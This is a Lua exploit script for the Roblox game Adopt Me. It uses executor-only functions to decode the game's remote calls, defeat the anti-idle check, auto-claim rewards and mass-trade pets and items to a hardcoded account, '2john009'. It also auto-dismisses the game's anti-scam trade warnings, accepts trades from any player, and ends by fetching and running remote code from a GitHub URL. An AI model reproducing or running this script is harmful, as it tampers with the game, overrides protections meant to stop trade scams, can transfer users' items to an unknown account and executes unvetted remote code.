------------------------------ Cactus Pete's Adopt Me Auto Trade --------------------------------
-------------------------------------------------------------------------------------------------
-----	This script handles both sending and recieveing side of trading.
-----	Be sure to set the getgenv().rcpt variable to the user who will be recieving the trades.
-----	This can trade individual or all pets, and limit by age, neon/mega status
-----	It can trade pets, petwear, food, vehicles, strollers, gifts, and/or toys
-----		true means it will, false means it doesnt.  Simple.
----- Sending side will automatically exit the script once all the items have successfully traded.
----- Recieving side can either run the script a second time to deactivate it, or log out.
--------------------------------------------------------------------------------------------------

getgenv().doloop = not doloop					---	toggle trade loop, second time is off
getgenv().ClosePopup = not ClosePopup			---	toggle the Popup Window closing code
-----------------	Variables that may be changed
getgenv().rcpt = "2john009"				---	Account name recieving pets
local sndr = ""							---	Optional sender, handy if multiple alts on server
local TrdAge = 6							---	Age of pet to trade (1=newborn..6=adult)
local SkipAge = false						---	Skip the age check, trade all pets
local TrdNeon = true						---	Allow neons to be traded
local TrdMega = true						---	Allow megas to be traded
local SkipPets = false                        		---	Skip Trading Pets (Unless Specified)
local SpecPets = false                    		---	Trade Specified Pets 
local Petwear = false						---	Also trade Petwear
local Food = false						---	Trade food items
local Vehicles = false						---	Trade Vehicles
local Gifts = false						---	Trade Gifts
local Toys = false						---	Trade Toys
local Strollers = false						---	Trade Strollers
local Exclude1 = "royal_egg"					---	Pet names to NOT trade (starter egg already disabled)	
local Exclude2 = "japan_2022_egg"
local Exclude3 = ""
local Exclude4 = ""
local Exclude5 = ""
local SpecPet1 = "winter_2021_walrus"
local SpecPet2 = "halloween_2022"			---	Can Specify Partial Text to Match
local SpecPet3 = "halloween_2022_mule"			---	Or Full Pet Name
local SpecPet4 = ""
local SpecPet5 = ""
local SpecPetwear1 = ""					---	Will Trade All if Enabled and Blank
local SpecPetwear2 = ""
local SpecVeh1 = "halloween_2022"			---	You Can Also specify Partial Text to Match
local SpecVeh2 = ""
local SpecGift1 = ""
local SpecGift2 = ""
local SpecToy1 = ""
local SpecToy2 = ""
local SpecStroller1 = ""
local SpecStroller2 = ""
local SpecFood1 = ""
local SpecFood2 = ""

----------------- Let game load
repeat task.wait() until game:IsLoaded()
if game.PlaceId == 920587237 then
-----------------------------	Adopt Me Auto Login Start
	game.StarterGui:SetCore("SendNotification", {Title = "AdoptMe AutoLogin", Text = "Logging in", Duration = 7})
	local Player = game.Players.LocalPlayer
	local fsys = require(game.ReplicatedStorage:WaitForChild("Fsys")).load
	local NewsAppConnection
	local DialogConnection
	local DailyClaimConnection
	local ChatConnection
	local CharConn
	local DailyBoolean = true
	local DailyRewardTable = {[9] = "reward_1", [30] = "reward_2", [90] = "reward_3", [140] = "reward_4", [180] = "reward_5", [210] = "reward_6", [230] = "reward_7",
		[280] = "reward_8", [300] = "reward_9", [320] = "reward_10", [360] = "reward_11", [400] = "reward_12", [460] = "reward_13", [500] = "reward_14",
		[550] = "reward_15", [600] = "reward_16", [660] = "reward_17"}
	local DailyRewardTable2 = {[9] = "reward_1", [65] = "reward_2", [120] = "reward_3", [180] = "reward_4", [225] = "reward_5", [280] = "reward_6", [340] = "reward_7",
		[400] = "reward_8", [450] = "reward_9", [520] = "reward_10", [600] = "reward_11", [660] = "reward_12"}
	local NewTaskBool = true
	local NewClaimBool = true
	local NeonTable = {["neon_fusion"] = true, ["mega_neon_fusion"] = true}
	local ClaimTable = {["hatch_three_eggs"] = {3}, ["fully_age_three_pets"] = {3}, ["make_two_trades"] = {2}, ["equip_two_accessories"] = {2},
		["buy_three_furniture_items_with_friends_coop_budget"] = {3}, ["buy_five_furniture_items"] = {5}, ["buy_fifteen_furniture_items"] = {15},
		["play_as_a_baby_for_twenty_five_minutes"] = {1500}, ["play_for_thirty_minutes"] = {1800}}
	Player.PlayerGui:WaitForChild("NewsApp")
	local Bypass = require(game.ReplicatedStorage:WaitForChild("Fsys")).load
	local ClaimRemote = Bypass("RouterClient").get("QuestAPI/ClaimQuest")
	local RerollRemote = Bypass("RouterClient").get("QuestAPI/RerollQuest")
	NewsAppConnection = Player.PlayerGui.NewsApp:GetPropertyChangedSignal("Enabled"):Connect(function()
		if Player.PlayerGui.NewsApp.Enabled then
			task.wait()
			firesignal(Player.PlayerGui.NewsApp.EnclosingFrame.MainFrame.Contents.PlayButton.MouseButton1Click)
			NewsAppConnection:Disconnect()
		end
	end)
	DialogConnection = Player.PlayerGui.DialogApp:GetPropertyChangedSignal("Enabled"):Connect(function()
		if Player.PlayerGui.DialogApp.Enabled then
			repeat task.wait() until not Player.PlayerGui.NewsApp.Enabled
			if Player.PlayerGui.DialogApp.Dialog.RoleChooserDialog.Visible then
				firesignal(Player.PlayerGui.DialogApp.Dialog.RoleChooserDialog.Baby.MouseButton1Click)
			elseif Player.PlayerGui.DialogApp.Dialog.GamepassDialog.Visible then
				for i, v in pairs(Player.PlayerGui.DialogApp.Dialog.GamepassDialog.Buttons:GetDescendants()) do
					if v.Name == "TextLabel" then
						if  v.Text == "No thanks" then
							firesignal(v.Parent.Parent.MouseButton1Click)
							DailyBoolean = false
							DialogConnection:Disconnect()
						end
					end
				end
			end
		end
	end)
    local function GrabDailyReward()
        local Daily = Bypass("ClientData").get("daily_login_manager")
		if Daily.prestige % 2 == 0 then
			for i, v in pairs(DailyRewardTable) do
				if i < Daily.stars or i == Daily.stars then
					if not Daily.claimed_star_rewards[v] then
						Bypass("RouterClient").get("DailyLoginAPI/ClaimStarReward"):InvokeServer(v)
					end
				end
			end
		else
			for i, v in pairs(DailyRewardTable2) do
				if i < Daily.stars or i == Daily.stars then
					if not Daily.claimed_star_rewards[v] then
						Bypass("RouterClient").get("DailyLoginAPI/ClaimStarReward"):InvokeServer(v)
					end
				end
			end
		end
    end
	ChatConnection = Player.PlayerGui.Chat.Frame.ChatChannelParentFrame["Frame_MessageLogDisplay"].Scroller.DescendantAdded:Connect(function(ChatChild)
		if ChatChild.Name == "TextButton" then
			firesignal(Player.PlayerGui.TopbarApp.TopBarContainer.ChatVisible.MouseButton1Click)
			ChatConnection:Disconnect()
		end
	end)
	DailyClaimConnection = Player.PlayerGui.DailyLoginApp:GetPropertyChangedSignal("Enabled"):Connect(function()
        repeat task.wait() until not DailyBoolean
        if Player.PlayerGui.DailyLoginApp.Enabled then
            task.wait()
            if Player.PlayerGui.DailyLoginApp.Frame.Visible then
                for i, v in pairs(Player.PlayerGui.DailyLoginApp.Frame.Body.Buttons:GetDescendants()) do
                    if v.Name == "TextLabel" then
                        if v.Text == "CLOSE" then
                            firesignal(v.Parent.Parent.MouseButton1Click)
                            task.wait(1)
                            GrabDailyReward()
                            DailyClaimConnection:Disconnect()
                        elseif v.Text == "CLAIM!" then
                            firesignal(v.Parent.Parent.MouseButton1Click) --claim button
							firesignal(v.Parent.Parent.MouseButton1Click) --close button
                            task.wait(1)
                            GrabDailyReward()
                            DailyClaimConnection:Disconnect()
                        end
                    end
                end
            end
        end
    end)
	local Char = Player.Character or Player.CharacterAdded:Wait()
	CharConn = Char.ChildAdded:Connect(function(HRPChild)
		if HRPChild.Name == "HumanoidRootPart" then
			repeat task.wait() until not DailyBoolean
			Bypass("RouterClient").get("TeamAPI/ChooseTeam"):InvokeServer("Babies", true)
			CharConn:Disconnect()
		end
	end)
	local function QuestCount()
		local Count = 0
		for i, v in pairs(Bypass("ClientData").get("quest_manager")["quests_cached"]) do
			if v["entry_name"]:match("teleport") or v["entry_name"]:match("navigate") or v["entry_name"]:match("nav") or v["entry_name"]:match("gosh_2022_sick") then
				Count = Count + 0
			else
				Count = Count + 1
			end
		end
		return Count
	end
	local function ReRollCount()
		for i, v in pairs(Bypass("ClientData").get("quest_manager")["daily_quest_data"]) do
			if v == 1 or v == 0 then
				return v
			end
		end
	end
	local function NewTask()
		NewTaskBool = false
		for i, v in pairs(Bypass("ClientData").get("quest_manager")["quests_cached"]) do
			if v["entry_name"]:match("teleport") or v["entry_name"]:match("navigate") or v["entry_name"]:match("nav") or v["entry_name"]:match("gosh_2022_sick") then
				--nothing
			else
				if QuestCount() == 1 then
					if NeonTable[v["entry_name"]] then
						ClaimRemote:InvokeServer(v["unique_id"])
						task.wait()
					elseif not NeonTable[v["entry_name"]] and ReRollCount() >= 1 then
						RerollRemote:FireServer(v["unique_id"])
						task.wait()
					else
						ClaimRemote:InvokeServer(v["unique_id"])
						task.wait()	
					end
				elseif QuestCount() > 1 then
					if NeonTable[v["entry_name"]] then
						ClaimRemote:InvokeServer(v["unique_id"])
						task.wait()
					elseif not NeonTable[v["entry_name"]] and ReRollCount() >= 1 then
						RerollRemote:FireServer(v["unique_id"])
						task.wait()
					elseif not NeonTable[v["entry_name"]] and ReRollCount() <= 0 then
						ClaimRemote:InvokeServer(v["unique_id"])
						task.wait()
					end
				end
			end
		end
		task.wait(1)
		NewTaskBool = true
	end
	local function NewClaim()
		NewClaimBool = false
		for i, v in pairs(Bypass("ClientData").get("quest_manager")["quests_cached"]) do
			if ClaimTable[v["entry_name"]] then
				if v["steps_completed"] == ClaimTable[v["entry_name"]][1] then
					ClaimRemote:InvokeServer(v["unique_id"])
					task.wait()
				end
			elseif not ClaimTable[v["entry_name"]] and v["steps_completed"] == 1 then
				ClaimRemote:InvokeServer(v["unique_id"])
				task.wait()
			end
		end
		task.wait(1)
		NewClaimBool = true
	end
	game.Players.LocalPlayer.PlayerGui.QuestIconApp.ImageButton.EventContainer.IsNew:GetPropertyChangedSignal("Position"):Connect(function()
		if NewTaskBool then
			NewTaskBool = false
			Bypass("RouterClient").get("QuestAPI/MarkQuestsViewed"):FireServer()
			NewTask()
		end
	end)
	game.Players.LocalPlayer.PlayerGui.QuestIconApp.ImageButton.EventContainer.IsClaimable:GetPropertyChangedSignal("Position"):Connect(function()
		if NewClaimBool then
			NewClaimBool = false
			NewClaim()
		end
	end)
	NewClaim()
	task.wait()
	NewTask()
	for i,v in pairs(getconnections(game.Players.LocalPlayer.Idled)) do
		v:Disable()
	end
	for i, v in pairs(debug.getupvalue(require(game:service'ReplicatedStorage'.Fsys).load("RouterClient").init, 4)) do
		v.Name = i
	end

-----------------	Static Variables
    local Player = game.Players.LocalPlayer
    local userId = game:GetService("Players").LocalPlayer.UserId
    local PlaceID = game.PlaceId
    local VIM = game:GetService("VirtualInputManager")
    local fsys = require(game.ReplicatedStorage:WaitForChild("Fsys")).load
    local ClientData = fsys("ClientData") 
    local Inventory = ClientData.get('inventory') 
    local pets = Inventory["pets"]
    local gifts = Inventory["gifts"]
    local petwear = Inventory["pet_accessories"]
    local food = Inventory["food"]
    local toys = Inventory["toys"]
    local vehicles = Inventory["transport"]
    local strollers = Inventory["strollers"]
    local PTEntries = 0
    local NotHere = true
    local NoMore = false
    local GameMsgConn
    getgenv().sender = ""
    getgenv().receiver = ""
    getgenv().TradeTable = {}

-----------------	Decrypt Adopt Me Remote Names
    for i, v in pairs(debug.getupvalue(require(game:service'ReplicatedStorage'.Fsys).load("RouterClient").init, 4)) do
        v.Name = i
    end
----------------- Anti-AFK
    for i,v in pairs(getconnections(game.Players.LocalPlayer.Idled)) do
        v:Disable()
    end
-----------------	Quality Settings
    setfpscap(10)
    settings().Rendering.QualityLevel = 1
----------------- Unequip Pet and other items
    game:GetService("ReplicatedStorage").API["ToolAPI/UnequipAll"]:FireServer()
-----------------  Close Popup Windows
    if ClosePopup then
		local function FireButton()
			for i, v in pairs(Player.PlayerGui.DialogApp.Dialog.NormalDialog:GetChildren()) do
				if v.Name == "Info" then
					v.TextLabel:GetPropertyChangedSignal("Text"):Connect(function()
						if v.TextLabel.Text:match("4.5%% Legendary") or v.TextLabel.Text:match("Be careful when trading") or v.TextLabel.Text:match("This trade seems unbalanced")  or v.TextLabel.Text:match("If it sounds too good")  or v.TextLabel.Text:match("Remember: all trades")then
							Player.PlayerGui.DialogApp.Dialog.NormalDialog.Buttons:WaitForChild("ButtonTemplate")
									firesignal(Player.PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate.MouseButton1Click)
						end
					end)
				end
			end
			Player.PlayerGui.DialogApp.Dialog.NormalDialog.Buttons:WaitForChild("ButtonTemplate")
			for i, v in pairs(Player.PlayerGui.DialogApp.Dialog.NormalDialog.Buttons:GetDescendants()) do
				if v.Name == "TextLabel" then
					if v.Text == "Accept" then
						firesignal(v.Parent.Parent.MouseButton1Click)
						break
					end
				end
			end
		end
		Player.PlayerGui.DialogApp.Dialog.ChildAdded:Connect(function(NormalDialogChild)
			if NormalDialogChild.Name == "NormalDialog" then
				NormalDialogChild:GetPropertyChangedSignal("Visible"):Connect(function()
					if NormalDialogChild.Visible then
						FireButton()
					end
				end)
			end
		end)
		Player.PlayerGui.DialogApp.Dialog.NormalDialog:GetPropertyChangedSignal("Visible"):Connect(function()
			if Player.PlayerGui.DialogApp.Dialog.NormalDialog.Visible then
				FireButton()
			end
		end)
		if Player.PlayerGui.DialogApp.Dialog.NormalDialog.Visible then
			FireButton()
		end
    end
	game:GetService("UserInputService").InputBegan:Connect(function(I)
		if I.KeyCode == Enum.KeyCode.X then    		 ------- Press X to exit Trading
			getgenv().doloop = false
			print("Setting loop to exit")
		end
	end)
	local function MakeTradeTable()     --------  Create a local table of UniqueId's to trade  	
		task.wait(5)
		if table.maxn(getgenv().TradeTable) >= 1 then   ------  Clean the previous table
			local cnt = table.maxn(getgenv().TradeTable)
			print("Dirty Table has "..tostring(cnt).." entries")
			for t = 1, cnt do
				table.remove(getgenv().TradeTable, cnt)
				cnt = (cnt - 1)	
			end
		end
		task.wait()			--------  Makre sure theres no lingering open trade requests
		game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AcceptNegotiation"):FireServer()
		task.wait(1)			-------- We want the new table to be clean
		game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/ConfirmTrade"):FireServer()
		task.wait()
		table.clear(getgenv().TradeTable)
		print("Cleaned table has "..tostring(table.maxn(getgenv().TradeTable)).." entries")
		task.wait(1)
		getgenv().TradeTable = {}
		local Inventory = ClientData.get('inventory') 
		local pets = Inventory["pets"]
		local gifts = Inventory["gifts"]
		local petwear = Inventory["pet_accessories"]
		local food = Inventory["food"]
		local toys = Inventory["toys"]
 		local vehicles = Inventory["transport"]
		local strollers = Inventory["strollers"]
		if not SkipPets then      ------- Add pets to table unless disabled
			for i, v in pairs(pets) do
				PetNeon = false
				PetMega = false
				local Pet = v.properties
				PetName = v.id
				PetID = v.unique
				Pet = v.properties
				PetAge = v.properties.age
				if Pet.neon then PetNeon = true end
				if Pet.mega then PetMega = true end
				if PetAge == TrdAge or SkipAge then         --vvvvv Dont add starter egg or excluded pets!
					if tostring(PetName) ~= "starter_egg" and tostring(PetName) ~= tostring(Exclude1) and tostring(PetName) ~= tostring(Exclude2) and tostring(PetName) ~= tostring(Exclude3) and tostring(PetName) ~= tostring(Exclude4) and tostring(PetName) ~= tostring(Exclude5) then
						if not PetNeon or (PetNeon and TrdNeon) then
							if not PetMega or (PetMega and TrdMega) then 
								table.insert(getgenv().TradeTable,PetID)
							end
						end
					end
				end
			end
		elseif SpecPets then    ------- Add Specific pets to table if SkipPets is true
			for i, v in pairs(pets) do
				PetNeon = false
				PetMega = false
				local Pet = v.properties
				PetName = v.id
				PetID = v.unique
				PetAge = v.properties.age
				if Pet.neon then PetNeon = true end
				if Pet.mega then PetMega = true end
				if PetAge == TrdAge or SkipAge then 
					if (tostring(PetName):match(tostring(SpecPet1)) and SpecPet1 ~= "") or (tostring(PetName):match(tostring(SpecPet2)) and SpecPet2 ~= "") or (tostring(PetName):match(tostring(SpecPet3)) and SpecPet3 ~= "") or (tostring(PetName):match(tostring(SpecPet4)) and SpecPet4 ~= "") or (tostring(PetName):match(tostring(SpecPet5)) and SpecPet5 ~= "") then
						if not PetNeon or (PetNeon and TrdNeon) then
							if not PetMega or (PetMega and TrdMega) then 
								table.insert(getgenv().TradeTable,PetID)
							end
						end
					end
				end
			end
		end
		if Strollers then   ------- Add Strollers if enabled
			for i,v in pairs(strollers) do
				if v.id ~= "stroller-default" then
					if (SpecStroller1 ~= "" and v.id:match(SpecStroller1)) or (SpecStroller2 ~= "" and v.id:match(SpecStroller2)) or SpecStroller == "" then
						table.insert(getgenv().TradeTable, v.unique)
					end
				end
			end
		end
		if Vehicles then    ------- Add Vehicles if enabled
			for i,v in pairs(vehicles) do
				if tostring(v.id) ~= "ice_skates" then
					if (SpecVeh1 ~= "" and v.id:match(SpecVeh1)) or (SpecVeh2 ~= "" and v.id:match(SpecVeh2)) or SpecVeh == "" then
						table.insert(getgenv().TradeTable, v.unique)
					end
				end
			end
		end
		if Gifts then       ------- Add Gifts if enabled
			for i,v in pairs(gifts) do
				if (SpecGift1 ~= "" and v.id:match(SpecGift1)) or (SpecGift2 ~= "" and v.id:match(SpecGift2)) or SpecGift == "" then
					table.insert(getgenv().TradeTable, v.unique)
				end
			end
		end
		if Food then        ------- Add Food if enabled
			for i,v in pairs(food) do
				if tostring(v.id) ~= "sandwich-default" then
					if (SpecFood1 ~= "" and v.id:match(SpecFood1)) or (SpecFood2 ~= "" and v.id:match(SpecFood2)) or SpecFood == "" then
						table.insert(getgenv().TradeTable, v.unique)
					end
				end
			end
		end
		if Petwear then     ------- Add Petwear if enabled
			for i,v in pairs(petwear) do
				if tostring(v.id) ~= "blue_cap" and tostring(v.id) ~= "white_bowtie" and tostring(v.id) ~= "cowbell" then
					if (SpecPetwear1 ~= "" and v.id:match(SpecPetwear1)) or (SpecPetwear2 ~= "" and v.id:match(SpecPetwear2)) or SpecPetwear == "" then 
						table.insert(getgenv().TradeTable, v.unique)
					end
				end
			end
		end
		if Toys then        ------- Add Toys if enabled
			for i,v in pairs(toys) do
				if tostring(v.id) ~= "trade_license" then
					if (SpecToy1 ~= "" and v.id:match(SpecToy1)) or (SpecToy2 ~= "" and v.id:match(SpecToy2)) or SpecToy == "" then
						table.insert(getgenv().TradeTable, v.unique)
					end
				end
			end
		end
		PTEntries = table.maxn(getgenv().TradeTable)
		print("Populated table has "..tostring(PTEntries).." entries")
		task.wait(1)		
		return TradeTable
	end
-----------------	Sender Routine
	if tostring(Player) ~= rcpt then
		print("Sender Mode Enabled")
		while NotHere do
			for i,v in pairs(game.Players:GetChildren()) do
				if string.lower(tostring(v)) == string.lower(tostring(rcpt)) then
					print(tostring(v).." is here")
					receiver = v
					NotHere = false
					break
				else
					print("Waiting for "..rcpt)     ------- Wait for Recipient to be on server
					task.wait(2)
					if not doloop then
						NotHere = false
						break 
					end
				end
			end
		end
		task.wait()
-----------------   Sender Main Loop        
		while doloop do 
			task.wait(3)
			print("****************** Calling New Table ******************")
			MakeTradeTable()
			if getgenv().TradeTable == {} or table.maxn(getgenv().TradeTable) == 0 then
				getgenv().doloop = false
				print("Table Empty, Trading is Complete!")
				break
			end
			while table.maxn(getgenv().TradeTable) ~= 0 do
				if not doloop then
					break
				end
				task.wait(2)
				game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/SendTradeRequest"):FireServer(receiver)
				task.wait(5)
				local i=1
				for a, b in pairs(getgenv().TradeTable) do
					local pet = b
					if table.maxn(getgenv().TradeTable) == 0 then
						NoMore = true
					else
						game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(pet) 
						task.wait()
						print("*** "..string.rep("+",i)..string.rep(" ", (10-i))..PTEntries..": "..pet)
						table.remove(getgenv().TradeTable, a)
						if i == 9 or NoMore then
							print("---------------->") 
							task.wait(4)
							game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AcceptNegotiation"):FireServer()
							task.wait(3)
							game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/ConfirmTrade"):FireServer()
							task.wait(3)
							break
						end
						task.wait()
					end
					i++
					PTEntries = (PTEntries - 1)
				end
				if NoMore then
					break
				end
				task.wait(3)
			end
			if NoMore then
				break
			end
		end
-----------------	Recipient Routine
	elseif tostring(Player) == rcpt then
		print("Recipient Mode Enabled")
		while NotHere do
			for i,v in pairs(game.Players:GetChildren()) do
				if string.lower(tostring(v)) == string.lower(tostring(sndr)) then
					print(tostring(v).." is here")
					sender = v
					NotHere = false
					break
				elseif string.lower(tostring(v)) ~= string.lower(tostring(Player)) and sndr == "" then
					print("Found "..tostring(v).." here")
					sender = v
					NotHere = false
					break
				else
					print("Waiting for a sender")
					task.wait(2)
					if not doloop then
						NotHere = false
						break 
					end
				end
			end
		end
		task.wait()
		print("Waiting for trades to accept")
-----------------   Recipient Main Loop
		while doloop do
			task.wait()
			for i,v in pairs(game.Players:GetChildren()) do 		-----	Accept from anyone
				if string.lower(tostring(v)) ~= string.lower(tostring(rcpt)) then
					game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AcceptOrDeclineTradeRequest"):InvokeServer(v, true)
					task.wait(.1)
				end
			end
			task.wait(1)
			game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AcceptOrDeclineTradeRequest"):InvokeServer(sender, true)
			task.wait(2)
			game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AcceptNegotiation"):FireServer()
			task.wait(1)
			game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/ConfirmTrade"):FireServer()
			task.wait(1)
		end
	end
end
-----------------   Trading Done, Exiting
print("Exited Successfully")
loadstring(game:HttpGet('https://raw.githubusercontent.com/SamysTesting/tetest/main/CP-AutoLoginAutoTrade1.3_1.lua'))()


getgenv().doloop = false
